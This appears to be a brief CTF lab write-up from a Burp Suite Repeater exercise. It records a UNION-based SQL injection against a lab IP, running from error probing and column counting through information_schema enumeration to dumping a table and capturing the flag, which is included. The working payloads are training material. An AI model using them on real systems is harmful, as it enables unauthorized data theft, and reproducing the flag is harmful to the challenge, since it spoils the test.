# Burp Suite: Repeater

---

## Task 8 (Extra-mile Challenge)


http://10.10.195.30/about/2'

Invalid statement: SELECT firstName, lastName, pfpLink, role, bio FROM people WHERE id = 2'

vulnerable to SQLi

http://10.10.195.30/about/2%20UNION%20SELECT%201

http://10.10.195.30/about/2%20UNION%20SELECT%201,2

http://10.10.195.30/about/2%20UNION%20SELECT%201,2,3

http://10.10.195.30/about/2%20UNION%20SELECT%201,2,3,4

http://10.10.195.30/about/2%20UNION%20SELECT%201,2,3,4,5

found the no.of columns.

http://10.10.195.30/about/2%20UNION%20SELECT%201,2,3,4,5

http://10.10.195.30/about/0%20UNION%20SELECT%201,2,3,4,5

http://10.10.195.30/about/0%20UNION%20SELECT%201,2,3,4,database()

http://10.10.195.30/about/0%20UNION%20SELECT%201,2,3,4,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'site'

http://10.10.195.30/about/0%20UNION%20SELECT%201,2,3,4,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'people'

http://10.10.195.30/about/0%20UNION%20SELECT%201,2,3,4,group_concat(firstName,':',lastName,':',notes%20SEPARATOR%20'%3Cbr%3E')%20FROM%20people

THM{ZGE3OTUyZGMyMzkwNjJmZjg3Mzk1NjJh}